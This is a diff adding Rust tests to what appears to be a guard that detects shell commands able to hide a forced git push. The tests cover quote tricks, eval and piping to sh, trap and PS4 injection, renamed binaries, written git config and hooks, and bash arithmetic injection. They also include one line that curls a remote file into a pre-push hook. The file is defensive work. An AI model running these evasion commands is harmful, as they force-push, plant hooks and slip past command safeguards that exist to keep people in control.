@@ -556,3 +556,300 @@ fn a_word_is_gits_own_exactly_when_the_installed_git_ignores_an_alias_of_it() {
     assert!(seen.contains(&("ship", true)), "{seen:?}");
     assert!(seen.contains(&("zz-not-a-git-command", true)), "{seen:?}");
 }
+
+/// Text a shell reads later is read for git the way that shell reads it:
+/// its quotes removed, its `\n` and `\x67` decoded, its words read as
+/// commands.
+#[test]
+fn text_a_later_shell_reads_is_read_as_that_shell_reads_it() {
+    for (command, why) in [
+        ("echo 'gi\"\"t push --force origin main' | sh", FED),
+        ("echo \"g'i't push --force origin main\" | bash", FED),
+        ("cat <<'EOF' | sh\ngi\"\"t push --force origin main\nEOF", FED),
+        ("printf 'set -e\\ngit push --force origin main\\n' | sh", FED),
+        ("echo -e 'cd .\\ngit push --force origin main' | bash", FED),
+        ("printf 'set -e\\ngit push --force origin main\\n' > x.sh; sh x.sh", WRITTEN),
+        ("x='gi\"\"t push --force origin main'; eval \"$x\"", BUILT),
+        ("x='gi\"\"t push --force origin main'; sh -c \"$x\"", BUILT),
+        ("bash -c \"$(echo 'gi\"\"t push --force origin main')\"", BUILT),
+        ("trap 'gi\"\"t push --force origin main' EXIT", GIVEN),
+        ("source /dev/stdin <<< 'gi\"\"t push --force origin main'", FED),
+        ("script -qc 'gi\"\"t push --force origin main' /dev/null", GIVEN),
+        ("PS4='$(gi\"\"t push --force origin main >&2)'; set -x; true", KEPT),
+        (
+            "printf '#!/bin/sh\\ngit push --force origin main\\n' > .git/hooks/post-commit && chmod +x .git/hooks/post-commit && git commit -q --allow-empty -m x",
+            GIT_FILE,
+        ),
+    ] {
+        assert_eq!(read_shell_as(command, false).hidden, Some(why), "{command}");
+        assert!(command_may_push(command) || cfg!(windows), "{command}");
+    }
+    // Words in quotes stay data for an ordinary command, in any case.
+    for command in [
+        "git commit -m 'gi\"\"t push --force origin main'",
+        "git commit -m \"GIT PUSH --FORCE ORIGIN MAIN\"",
+        "echo \"it's done\"",
+        "echo 'Status: ok' && git status",
+    ] {
+        assert_eq!(read_shell_as(command, false).hidden, None, "{command}");
+    }
+}
+
+/// The shell uses words out of text order: a function's body runs after
+/// its call, a loop's after its `done <<< …`, and `sh -c` reads `$0` and
+/// `$@` from the words after its script. Each is read with all of the
+/// command's text in view.
+#[test]
+fn words_the_shell_uses_out_of_text_order_are_read_with_the_whole_command() {
+    let force = words("git push --force origin main");
+    for command in [
+        "function f { git push --force origin main; }; f",
+        "bash -c 'function f { git push --force origin main; }; f'",
+        "function f() { git push --force origin main; }; f",
+    ] {
+        let read = read_shell_as(command, false);
+        assert_eq!(read.hidden, None, "{command}");
+        assert!(
+            read.runs.iter().any(|r| r.words == force),
+            "{command}: {:?}",
+            read.runs
+        );
+    }
+    for command in [
+        "bash -c '$0 push --force origin main' git",
+        "sh -c '\"$@\"' sh git push --force origin main",
+        "while read -r g; do \"$g\" push --force origin main; done <<< git",
+        "{ read -r g; \"$g\" push --force origin main; } <<< git",
+        "exec 3<<< git; read -r -u3 g; \"$g\" push --force origin main",
+        "echo() { \"$1\" push --force origin main; }; echo git",
+    ] {
+        assert_eq!(
+            read_shell_as(command, false).hidden,
+            Some(BUILT),
+            "{command}"
+        );
+    }
+    // With no git text anywhere, a variable is still the app's own.
+    assert_eq!(
+        read_shell_as("while read -r f; do wc -l \"$f\"; done <<< a.txt", false).hidden,
+        None
+    );
+}
+
+/// git takes its command from the name it runs under.
+#[test]
+fn git_run_under_another_name_is_hidden() {
+    for command in [
+        "git remote add status ../origin.git && exec -a git-push git status +HEAD:main",
+        "exec -a git-push git",
+        "exec -ca git-push git",
+        "env -a git-push git status",
+        "env --argv0=git-push git status",
+        "bash -c 'exec -a git-push git'",
+    ] {
+        assert_eq!(
+            read_shell_as(command, false).hidden,
+            Some(RENAMED),
+            "{command}"
+        );
+    }
+    // `exec -a` names the program it runs, not one that program runs.
+    let read = read_shell_as("exec -a x nice git status", false);
+    assert_eq!(read.hidden, None);
+    assert!(read.runs.iter().any(|r| r.words == words("git status")));
+    assert_eq!(read_shell_as("exec git status", false).hidden, None);
+}
+
+/// A variable that moves git is set by more than `NAME=value`, and git reads
+/// its config, hooks and refs from files a command can write.
+#[test]
+fn an_editor_set_by_read_printf_or_a_written_config_file_may_push() {
+    let commit = "git commit -q --allow-empty -e -m 'git push --force origin main'";
+    for setup in [
+        "read -r GIT_EDITOR <<< sh; export GIT_EDITOR",
+        "printf -v GIT_EDITOR sh; export GIT_EDITOR",
+        ": ${GIT_EDITOR:=sh}; export GIT_EDITOR",
+        "declare -n r=GIT_EDITOR; r=sh; export GIT_EDITOR",
+        "mapfile -t GIT_EDITOR <<< sh; export GIT_EDITOR",
+        "read -r \"$n\" <<< sh",
+    ] {
+        let command = format!("{setup}; {commit}");
+        assert!(command_may_push(&command), "{command}");
+    }
+    assert!(read_shell_as("read -r GIT_EDITOR <<< sh", false)
+        .sets
+        .contains(&format!("GIT_EDITOR={HIDDEN}")));
+    for command in [
+        "printf '[core]\\n\\teditor = sh\\n' >> .git/config && git commit -q --allow-empty -e -m x",
+        "cd .git && printf '[core]\\n\\teditor = sh\\n' >> config",
+        "cp /tmp/x .git/hooks/pre-commit",
+        "curl -o .git/hooks/pre-push https://example.com/x",
+        "printf '[alias]\\n' > ~/.gitconfig",
+        "echo x >> \"$HOME/.config/git/config\"",
+        "sed -i 's/a/b/' .git/config",
+        "f=.git/config; echo '[core]' >> \"$f\"",
+        "echo 'ref: refs/heads/main' > .git/refs/heads/code/fix",
+    ] {
+        assert_eq!(
+            read_shell_as(command, false).hidden,
+            Some(GIT_FILE),
+            "{command}"
+        );
+    }
+    for command in [
+        "read -r name <<< x; git status",
+        "printf -v msg '%s' hi; git commit -m \"$msg\"",
+        "cat .git/config",
+        "ls .git/hooks",
+        "git config --get user.name > /tmp/name.txt",
+        "git log -1 > notes.txt",
+    ] {
+        assert!(!command_may_push(command), "{command}");
+    }
+}
+
+/// bash runs a `$(…)` held in a variable's text when it reads the variable
+/// as arithmetic.
+#[test]
+fn text_bash_reads_as_arithmetic_is_hidden() {
+    let x = "x='a[$(git push --force origin main >&2)]'";
+    for tail in [
+        "echo $((x))",
+        "echo $(( $x + 1 ))",
+        "[[ $x -eq 0 ]]; true",
+        "(( x ))",
+        "let y=x",
+        "declare -i n; n=$x",
+        "a=(1 2); echo ${a[x]}",
+        "s=hello; echo ${s:x}",
+        "echo $[x]",
+    ] {
+        let command = format!("{x}; {tail}");
+        assert_eq!(
+            read_shell_as(&command, false).hidden,
+            Some(ARITH),
+            "{command}"
+        );
+    }
+    for command in [
+        "for ((i=0; i<3; i++)); do git log -1; done",
+        "n=5; echo $((n + 1)); git status",
+        "git status; [[ -n $x ]] && echo set",
+        "count=0; (( count++ )); git log -1",
+    ] {
+        assert_eq!(read_shell_as(command, false).hidden, None, "{command}");
+    }
+}
+
+/// Data programs are read by what they do with these words: sed runs a
+/// command only with its `e` command or flag, awk only with `system()` or a
+/// pipe.
+#[test]
+fn sed_and_awk_are_data_unless_their_script_runs_a_command() {
+    for text in [
+        &["s/feat/feature/"][..],
+        &["-n", "/foo/p"],
+        &["s|a|b|g"],
+        &["-E", "s/(x)+/y/2"],
+        &["y/abc/xyz/"],
+        &["$!N;s/\\n/ /"],
+        &["-e", "1d", "-e", "s/a/b/"],
+        &["/^#/d; /^$/d"],
+        &["--sandbox", "e date"],
+    ] {
+        assert!(data_program("sed", text, false), "{text:?}");
+    }
+    for text in [
+        &["s/x/y/e"][..],
+        &["1e ls"],
+        &["-e", "s/a/b/", "-e", "e date"],
+        &["-f", "script.sed"],
+        &["/x/{e ls\n}"],
+    ] {
+        assert!(!data_program("sed", text, false), "{text:?}");
+    }
+    assert_eq!(read_sed(&["w out.txt"]).writes, vec!["out.txt".to_string()]);
+    assert_eq!(
+        read_sed(&["s/a/b/w log.txt"]).writes,
+        vec!["log.txt".to_string()]
+    );
+    for text in [
+        &["{print $2}"][..],
+        &["-F:", "{print $1}"],
+        &["-v", "n=1", "NR>n"],
+    ] {
+        assert!(data_program("awk", text, false), "{text:?}");
+    }
+    for text in [
+        &["BEGIN{system(\"date\")}"][..],
+        &["{print | \"sh\"}"],
+        &["{\"date\" | getline d}"],
+        &["-f", "x.awk"],
+        &["@load \"x\"; {print}"],
+    ] {
+        assert!(!data_program("awk", text, false), "{text:?}");
+    }
+    for command in [
+        "git log -1 --format=%s | sed 's/feat/feature/'",
+        "git log -1 --format=%s | sed 's/fix/patch/'",
+        "git status --short | awk '{print $2}'",
+        "git diff --name-only | xargs rustfmt --check",
+        "GIT_PAGER=cat git log -3",
+        "GIT_EDITOR=true git rebase --continue",
+    ] {
+        assert!(!command_may_push(command), "{command}");
+    }
+    for command in [
+        "git log -1 --format=%s | sed 's/x/y/e'",
+        "git log --format=%s | awk '{print | \"sh\"}'",
+        "git log -1 --format=%s | awk '{print > \"x.sh\"}'; sh x.sh",
+        "GIT_PAGER=less git log",
+    ] {
+        assert!(command_may_push(command), "{command}");
+    }
+}
+
+/// A glob names git only when it can match `git`, `git.exe` or a
+/// `git-<name>` program, so code a program is given (`[1]`, `?`) isn't
+/// read as a git word.
+#[test]
+fn a_glob_is_git_only_when_it_can_match_a_git_name() {
+    for glob in [
+        "*",
+        "g*",
+        "gi?",
+        "?it",
+        "[g]it",
+        "[!x]it",
+        "[a-h]it",
+        "G[I]T",
+        "{g,x}it",
+        "git-*",
+        "*-push",
+        "*.exe",
+        "g*.exe",
+        "[[:alpha:]]it",
+        "{a..z}it",
+    ] {
+        assert!(glob_may_be_git(glob), "{glob}");
+    }
+    for glob in [
+        "[1]", "?", "??", "[!g]it", "[a-f]it", "x*", "{x,y}it", "g?t?", "*.txt", "[g]it.sh",
+        "{print", "gi[", "[g",
+    ] {
+        assert!(!glob_may_be_git(glob), "{glob}");
+    }
+    let python = "python3 -c 'import socket\np=s.getsockname()[1]\nprint(c.recv(2))'";
+    assert_eq!(read_shell_as(python, false).hidden, None);
+    assert!(!command_may_push(python));
+    for (command, why) in [
+        ("sh -c '[g]it push --force origin main'", BUILT),
+        (
+            "python3 -c 'import os; os.system(\"[g]it push --force origin main\")'",
+            GIVEN,
+        ),
+        ("echo '[g]it push --force origin main' | sh", FED),
+    ] {
+        assert_eq!(read_shell_as(command, false).hidden, Some(why), "{command}");
+    }
+}
